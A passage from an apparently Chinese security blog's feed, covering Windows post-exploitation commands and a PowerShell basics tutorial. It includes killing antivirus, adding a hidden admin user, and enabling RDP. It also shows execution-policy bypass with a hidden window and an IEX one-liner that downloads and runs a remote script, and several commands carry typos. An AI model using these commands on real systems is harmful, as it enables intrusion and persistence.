taskkill /im 360tray /f</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#用户管理命令：</span></span><br><span class="line">Net user hack <span class="number">123</span> /add    添加hack用户 密码为<span class="number">123</span></span><br><span class="line">Net localgroup adminnistrators hack /add   添加hack为管理员权限</span><br><span class="line">Net localgroup adminnistrators    查看当前系统管理员</span><br><span class="line">Net localgroup <span class="string">"remote desktop users"</span> hack /add   加入远程桌面用户组</span><br><span class="line">Net user hack     查看指定用户的信息</span><br><span class="line">Net user guest /active:yes   激活guest用户</span><br><span class="line">Net user guest <span class="number">123</span></span><br></pre></td></tr></table></figure><h4 id="2、windows系统开启远程桌面（mstsc-rdesktop）"><a href="#2、windows系统开启远程桌面（mstsc-rdesktop）" class="headerlink" title="2、windows系统开启远程桌面（mstsc/rdesktop）"></a>2、windows系统开启远程桌面（mstsc/rdesktop）</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#XP/Win2k3/Win7/Win2k8/Win8.1/Win10/2012/2016（0：ON、1：OFF）：</span></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">" "</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">0</span> /f</span><br><span class="line">                                                              </span><br><span class="line"></span><br><span class="line"><span class="comment">#Win2k3/Win7/Win2k8/Win8.1/Win10/2012/2016：（0：ON、1：OFF）：</span></span><br><span class="line">wmic RDTOGGLE WHERE ServerName=<span class="string">'%COMPUTERNAME%'</span> call SetAllowTSConnections <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Winserver2008/2012/Win2k3/win7</span></span><br><span class="line">wmic  /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=<span class="string">""</span>) call setallowtsconnections <span class="number">1</span></span><br><span class="line">                            </span><br><span class="line"></span><br><span class="line"><span class="comment">#Winserver2008/2012/</span></span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName =<span class="string">'RDP-Tcp'</span>) call setuserauthenticationrequired <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#XP/Win2k3/Win7/Win2k8/Win8.1/Win10/2012/2016（Metasploit）：</span></span><br><span class="line">meterpreter &gt; run getgui -e</span><br></pre></td></tr></table></figure><h4 id="3、查看远程端口"><a href="#3、查看远程端口" class="headerlink" title="3、查看远程端口"></a>3、查看远程端口</h4><h6 id="通过注册表查看："><a href="#通过注册表查看：" class="headerlink" title="通过注册表查看："></a>通过注册表查看：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber 查询rdp端口号</span><br><span class="line">set /a port = query hex value</span><br></pre></td></tr></table></figure><h6 id="通过命令查看"><a href="#通过命令查看" class="headerlink" title="通过命令查看"></a>通过命令查看</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Tasklist /svc |find <span class="string">"TermService"</span></span><br><span class="line">Netstat -ano |find <span class="string">"1980"</span></span><br></pre></td></tr></table></figure><blockquote><p>本文转载</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;1、windows系统基础命令&quot;&gt;&lt;a href=&quot;#1、windows系统基础命令&quot; class=&quot;headerlink&quot; title=&quot;1、windows系统基础命令&quot;&gt;&lt;/a&gt;1、windows系统基础命令&lt;/h4&gt;&lt;figure class=&quot;highli
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="Windows命令" scheme="http://www.xpshuai.cn/tags/Windows%E5%91%BD%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>PowerShell基础知识</title>
    <link href="http://www.xpshuai.cn/PowerShell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <id>http://www.xpshuai.cn/PowerShell基础知识/</id>
    <published>2020-03-19T10:35:06.000Z</published>
    <updated>2020-03-19T10:44:23.597Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/PowerShell基础知识/powershell.jpg"></p><a id="more"></a><h1 id="PowerShell技术概学"><a href="#PowerShell技术概学" class="headerlink" title="PowerShell技术概学"></a><center><font color="red">PowerShell技术概学</font></center></h1><blockquote><p>本文内容较琐碎，思路较混乱，仅当入门小小小基础吧</p></blockquote><h2 id="Powershell基础"><a href="#Powershell基础" class="headerlink" title="Powershell基础"></a>Powershell基础</h2><h6 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h6><ul><li>可以面向对象</li><li>绑定.net</li><li>兼容性好</li><li>灵活 </li></ul><h6 id="基本常识"><a href="#基本常识" class="headerlink" title="基本常识"></a>基本常识</h6><ul><li>在PowerShell下，类似 cmd命令 叫作<code>cmdlet</code>  </li><li>命令规范：<code>动词-名词</code>  ， 不区分大小写</li><li>可以直接在cmd中运行<code>powershell</code>来打开</li></ul><h6 id="查看PowerShell版本"><a href="#查看PowerShell版本" class="headerlink" title="查看PowerShell版本"></a>查看PowerShell版本</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Get-Host</span><br><span class="line">或者</span><br><span class="line">$PSversionTable.PSVERSION</span><br></pre></td></tr></table></figure><p><strong>ps1文件：</strong>   一个PowerShell脚本其实就是一个简单的文本文件</p><p><strong>运行脚本</strong><br>1.完整路径<br>2.当前路径:<code>./test.ps1</code></p><h6 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Command</span> ： 得到所有PowerShell命令</span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-Process</span> ： 获取所有进程</span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-Help</span>  ： 显示有关 Windows PowerShell 命令和概念的信息</span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-History</span>  ： 获取在当前会话中输入的命令的列表</span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-Job</span> ：  获取在当前会话中运行的 Windows PowerShell 后台作业</span><br><span class="line"></span><br><span class="line">dir –r</span><br></pre></td></tr></table></figure><h6 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ExecutionPolicy</span>   <span class="comment">#查看当前策略</span></span><br><span class="line"></span><br><span class="line">- Restricted        <span class="comment">#脚本不能运行（默认）</span></span><br><span class="line">- RemoteSigned      <span class="comment">#本地创建的脚本可以运行，但从网上下载的脚本不能运行</span></span><br><span class="line">- AllSigned         <span class="comment">#仅当脚本由信任的发布者签名时才能运行</span></span><br><span class="line">- Unrestricted      <span class="comment">#允许所有的脚本运行</span></span><br></pre></td></tr></table></figure><h6 id="绕过本地权限执行脚本"><a href="#绕过本地权限执行脚本" class="headerlink" title="绕过本地权限执行脚本"></a>绕过本地权限执行脚本</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe  -ExexutionPolicy ByPass -File xxx.ps1</span><br><span class="line"></span><br><span class="line"><span class="comment"># -ExexutionPolicy ByPass   绕过执行安全策略</span></span><br></pre></td></tr></table></figure><h6 id="本地隐藏绕过权限执行脚本"><a href="#本地隐藏绕过权限执行脚本" class="headerlink" title="本地隐藏绕过权限执行脚本"></a>本地隐藏绕过权限执行脚本</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe  -ExexutionPolicy ByPass -WindowStyle Hidden -NoLogo -Nolnteractive -NoProfile -File xxx.ps1</span><br><span class="line"></span><br><span class="line"><span class="comment"># -WindowStyle Hidden 隐藏窗口</span></span><br><span class="line"><span class="comment"># -NoLogo    启动不显示版权标志的PowerShell</span></span><br></pre></td></tr></table></figure><h6 id="用IEX下载远程PS1脚本绕过权限执行脚本"><a href="#用IEX下载远程PS1脚本绕过权限执行脚本" class="headerlink" title="用IEX下载远程PS1脚本绕过权限执行脚本"></a>用IEX下载远程PS1脚本绕过权限执行脚本</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe  -ExexutionPolicy ByPass -WindowStyle Hidden -NoProfile -NonI IEX(New-ObjectNet.WebClient).DownloadString(<span class="string">"xxx.ps1"</span>);[Parameters]</span><br><span class="line"></span><br><span class="line"><span class="comment"># -NonI   非交互模式</span></span><br><span class="line"><span class="comment"># -NoProfile  /     -NoP         不加载当前用户的配置文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Noexit    执行后不退出Shell  （这在使用键盘记录等脚本时非常重要）</span></span><br></pre></td></tr></table></figure><p>可以直接在终端进行数字计算…..笑死</p><p><strong>自定义Powershell控制台</strong><br>右键自己看着自己的习惯调整吧<br>编辑选项：</p><ul><li>快速编辑选项（操作快且方便）</li><li>标准编辑选项</li></ul><p><strong>Powershell快捷键</strong><br>与linux中相似<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">alt+F7<span class="comment">#清除命令的历史记录</span></span><br><span class="line">PgUp   PgDn<span class="comment">#翻页的效果</span></span><br><span class="line">Esc<span class="comment">#情况命令行（我还是喜欢 ^L）</span></span><br><span class="line">Home<span class="comment">#移动到命令行最左端</span></span><br><span class="line">End<span class="comment">#移动到命令行最右端</span></span><br></pre></td></tr></table></figure></p><h6 id="Powershell管道和重定向"><a href="#Powershell管道和重定向" class="headerlink" title="Powershell管道和重定向"></a>Powershell管道和重定向</h6><p>基于对象的</p><p>管道：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#找字符串</span></span><br><span class="line">ls | findstr <span class="string">"an"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看name列</span></span><br><span class="line">ls | Format-table  name</span><br><span class="line"><span class="comment"># 还可以sort等</span></span><br><span class="line"></span><br><span class="line">`get-process p* | stop-process`   <span class="comment"># 找到p...的进程，然后停止</span></span><br></pre></td></tr></table></figure></p><p>重定向：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &gt;,  &gt;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#重定向到文件中</span></span><br><span class="line">ls | Format-table  name &gt;&gt; test.txt</span><br></pre></td></tr></table></figure></p><h6 id="Powershell数学运算"><a href="#Powershell数学运算" class="headerlink" title="Powershell数学运算"></a>Powershell数学运算</h6><p>直接在终端执行即可，无需多讲</p><ul><li>进行存储单位换算：</li><li><p>运算/比较</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#运算</span><br><span class="line">1gb/1mb*18kb</span><br><span class="line"># 比较</span><br><span class="line">1gb -gt 1mb</span><br></pre></td></tr></table></figure></li><li><p>进制转换，比如十六进制：<code>0xa</code></p></li></ul><h4 id="Powershell执行外部命令"><a href="#Powershell执行外部命令" class="headerlink" title="Powershell执行外部命令"></a>Powershell执行外部命令</h4><p>打开应用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#直接打开</span><br><span class="line">notepad</span><br><span class="line"></span><br><span class="line">#或者带双引号</span><br><span class="line">&amp;&quot;notepad&quot;</span><br><span class="line"></span><br><span class="line"># 直接打开服务</span><br><span class="line">services.exe</span><br><span class="line"></span><br><span class="line"># 查看环境变量</span><br><span class="line">$env:path</span><br><span class="line"></span><br><span class="line"># 仅在当前终端设置环境变量（临时生效）</span><br><span class="line">$env$path=$env$path+&quot;路径&quot;</span><br></pre></td></tr></table></figure></p><h4 id="Powershell命令集"><a href="#Powershell命令集" class="headerlink" title="Powershell命令集"></a>Powershell命令集</h4><blockquote><p>一般是<code>动词-名词</code>结构</p></blockquote><p>查看所有命令：<code>Get-Command</code><br>查看命令帮助: <code>get-help</code><br>查看命令历史：<code>get-history</code></p><h6 id="Powershell别名"><a href="#Powershell别名" class="headerlink" title="Powershell别名"></a>Powershell别名</h6><p><strong>使用</strong><br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看所有别名</span></span><br><span class="line"><span class="built_in">get-alias</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以查看命令别名</span></span><br><span class="line"><span class="built_in">get-help</span> 命令</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看别名对应的真实的命令</span></span><br><span class="line"><span class="built_in">get-alias</span> -name ls</span><br><span class="line"></span><br><span class="line"><span class="comment"># 找出以remove开头的别名():</span></span><br><span class="line"><span class="built_in">get-alias</span> | where &#123;<span class="variable">$_</span>.definition.startswitch(<span class="string">"Remove"</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询所有别名最多的，并排序</span></span><br><span class="line"><span class="built_in">get-alias</span> |<span class="built_in">group-object</span> definition |sort -descending Count</span><br></pre></td></tr></table></figure></p><p><strong>自定义别名</strong><br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 临时定义（退出终端就不生效了）</span></span><br><span class="line"><span class="built_in">set-alias</span> -name pad -value notepad`</span><br><span class="line"><span class="comment"># 删除别名  </span></span><br><span class="line">del alias pad</span><br><span class="line"></span><br><span class="line"><span class="comment">## 永久设置别名（写入Windows PowerShell profile文件）</span></span><br><span class="line"><span class="comment">#1.查看此文件在计算机中的位置：</span></span><br><span class="line"><span class="variable">$profile</span></span><br><span class="line"><span class="comment">#2.一般该文件在没有创建前是不存在的，使用以下命令为当前用户创建profile命令并返回文件地址：</span></span><br><span class="line"><span class="built_in">New-Item</span> -Type file -Force <span class="variable">$profile</span></span><br><span class="line"><span class="comment">#3.打开文件将一些内容写入文件，创建别名，比如;</span></span><br><span class="line"><span class="built_in">Set-Alias</span> notepad++ <span class="string">"C:\Development Kit\Notepad++\notepad++.exe"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导出别名</span></span><br><span class="line"><span class="built_in">export-alias</span> demp.ps1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入别名</span></span><br><span class="line"><span class="built_in">import-alias</span> -force demo.ps1</span><br></pre></td></tr></table></figure></p><h4 id="Powershell变量"><a href="#Powershell变量" class="headerlink" title="Powershell变量"></a>Powershell变量</h4><p><strong>变量基础</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#定义变量</span><br><span class="line">$name=&quot;hhh&quot;</span><br><span class="line">#打印 直接$name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Note: 大小写不敏感，所以特殊变量尽量用花括号</span><br><span class="line">$&#123;&quot;i am a boy&quot;&#125;=&quot;ggggg&quot;</span><br><span class="line"></span><br><span class="line"># 可以直接运算</span><br><span class="line">$n=(2+8*10)/2</span><br><span class="line"></span><br><span class="line"># 多个变量同时值</span><br><span class="line">$n1=$n2=1</span><br><span class="line">$m, $n=1, 2</span><br><span class="line"></span><br><span class="line">#调换变量值</span><br><span class="line">$n1, $n2=$n2, $n1</span><br></pre></td></tr></table></figure></p><p><strong>变量操作</strong><br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看变量是否存在  test-path</span></span><br><span class="line"><span class="built_in">test-path</span> variable:<span class="variable">$n1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除变量</span></span><br><span class="line">del variable:<span class="variable">$n1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">remove-variable</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## powershell提供了五个专门管理变量的命令</span></span><br><span class="line"><span class="built_in">Clear-Variable</span></span><br><span class="line"><span class="built_in">Get-Variable</span></span><br><span class="line"><span class="built_in">New-Variable</span></span><br><span class="line"><span class="built_in">Remove-Variable</span></span><br><span class="line"><span class="built_in">Set-Variable</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### 变量写保护（只读）</span></span><br><span class="line"><span class="comment">#1.设置</span></span><br><span class="line"><span class="variable">$server</span> = <span class="string">'10.10.10.10'</span></span><br><span class="line"><span class="built_in">Set-Variable</span> server -option Readonly</span><br><span class="line"><span class="comment">#2.新建时</span></span><br><span class="line"><span class="built_in">New-Variable</span> nu1 -Value <span class="number">100</span> -Force -Option readonly</span><br><span class="line"><span class="comment">#上面的变量不能更改，但是可以通过删除变量(del Variable:num -Force)，再重新创建变量更新变量内容。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 选项Constant，常量一旦声明，不可修改</span></span><br><span class="line"><span class="built_in">new-variable</span> num -Value <span class="string">"strong"</span> -Option constant</span><br></pre></td></tr></table></figure></p><p><strong>自动化变量</strong><br>1.用户信息：例如用户的根目录$home<br>2.配置信息:例如powershell控制台的大小，颜色，背景等。<br>3.运行时信息：例如一个函数由谁调用，一个脚本运行的目录等。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 比如：终端一打开就自动加载的变量</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用户根目录</span></span><br><span class="line"><span class="variable">$home</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 跟linux下基本一样</span></span><br><span class="line">$$<span class="comment">#包含会话所收到的最后一行中的最后一个令牌。</span></span><br><span class="line">$^<span class="comment">#包含会话所收到的最后一行中的第一个令牌。</span></span><br><span class="line">$?      <span class="comment">#上一个命令的返回值</span></span><br><span class="line"><span class="variable">$_</span><span class="comment">#包含管道对象中的当前对象</span></span><br><span class="line"><span class="variable">$pid</span><span class="comment">#进程id</span></span><br><span class="line"><span class="literal">$null</span></span><br><span class="line"><span class="variable">$Host</span></span><br><span class="line"><span class="variable">$LastExitCode</span>    <span class="comment">#包含运行的最后一个基于 Windows 的程序的退出代码。</span></span><br></pre></td></tr></table></figure><p>参考：<a href="https://www.pstips.net/powershell-automatic-variables.html" target="_blank" rel="noopener">这里</a></p><p><strong>环境变量</strong><br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看环境变量</span></span><br><span class="line">ls env</span><br><span class="line">ls env:name</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看具体环境变量的值</span></span><br><span class="line"><span class="variable">$env:windir</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建用户环境变量(临时)</span></span><br><span class="line"><span class="variable">$env:name</span>=<span class="string">"xxx"</span></span><br><span class="line"><span class="comment"># 新建环境变量(长久)</span></span><br><span class="line">xxx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在环境变量的PATH下添加一条内容</span></span><br><span class="line"><span class="variable">$Env:path</span>=<span class="variable">$Env:Path</span>+<span class="string">";C:\Go\bin"</span>  </span><br><span class="line"></span><br><span class="line"><span class="comment"># .net方式只对用户变量生效</span></span><br><span class="line">[environment]::setenvironment(<span class="string">"PATH"</span>,<span class="string">"D:\"</span>,<span class="string">"User"</span>)</span><br><span class="line"><span class="comment"># .net获取值</span></span><br><span class="line">[environment]::getenvironment(<span class="string">"PATH"</span>,<span class="string">"User"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除环境变量</span></span><br><span class="line">del env:name</span><br><span class="line"><span class="comment">#或</span></span><br><span class="line"><span class="built_in">remove-item</span> env:name</span><br></pre></td></tr></table></figure></p><h4 id="在其他脚本中使用powershell"><a href="#在其他脚本中使用powershell" class="headerlink" title="在其他脚本中使用powershell"></a>在其他脚本中使用powershell</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#比如bat</span></span><br><span class="line">@echo off</span><br><span class="line">powershell  <span class="string">"&amp;'c:\Users\test\e.psl'"</span></span><br></pre></td></tr></table></figure><h4 id="Powershell条件判断"><a href="#Powershell条件判断" class="headerlink" title="Powershell条件判断"></a>Powershell条件判断</h4><h6 id="条件操作符"><a href="#条件操作符" class="headerlink" title="条件操作符"></a>条件操作符</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="nomarkup">-eq</span>等于</span><br><span class="line"><span class="nomarkup">-ne</span>不等与</span><br><span class="line"><span class="nomarkup">-gt</span>大于</span><br><span class="line"><span class="nomarkup">-lt</span>小于</span><br><span class="line"><span class="nomarkup">-le</span>小于等于</span><br><span class="line"><span class="nomarkup">-contains</span></span><br><span class="line"><span class="comment">#布尔</span></span><br><span class="line"><span class="nomarkup">-not</span>取反</span><br><span class="line">-ant</span><br><span class="line">-or</span><br><span class="line">-xor</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 比如：</span></span><br><span class="line"><span class="number">80</span> <span class="nomarkup">-eq</span><span class="number">70</span></span><br><span class="line"><span class="number">1</span>gb <span class="nomarkup">-gt</span> lmb</span><br><span class="line">(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>) <span class="nomarkup">-contains</span> <span class="number">2</span></span><br></pre></td></tr></table></figure><h6 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h6><p>写脚本编辑器ISE里面了<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$num</span>=<span class="number">56</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span> <span class="nomarkup">-gt</span> <span class="number">50</span> -and <span class="variable">$num</span> <span class="nomarkup">-lt</span> <span class="number">60</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"大于50且小于60"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="variable">$num</span> <span class="nomarkup">-eq</span> <span class="number">50</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"等于50"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"小于50"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h6 id="switch语句"><a href="#switch语句" class="headerlink" title="switch语句"></a>switch语句</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$num</span>=<span class="number">45</span></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$num</span>)</span><br><span class="line">&#123;</span><br><span class="line">    &#123;(<span class="variable">$_</span> <span class="nomarkup">-lt</span> <span class="number">50</span>) -and (<span class="variable">$_</span> <span class="nomarkup">-gt</span> <span class="number">40</span>)&#125; &#123;<span class="string">"小于50且大于40"</span>&#125;</span><br><span class="line">    <span class="number">50</span> &#123;<span class="string">"等于50"</span>&#125;</span><br><span class="line">    &#123;<span class="variable">$_</span> <span class="nomarkup">-gt</span> <span class="number">50</span>&#125; &#123;<span class="string">"大于50"</span>&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Powershell循环结构"><a href="#Powershell循环结构" class="headerlink" title="Powershell循环结构"></a>Powershell循环结构</h4><h6 id="foreach语句"><a href="#foreach语句" class="headerlink" title="foreach语句"></a>foreach语句</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$arr</span>=<span class="number">1</span>..<span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$n</span> <span class="keyword">in</span> <span class="variable">$arr</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$n</span> <span class="nomarkup">-gt</span> <span class="number">5</span>)</span><br><span class="line">    &#123;</span><br><span 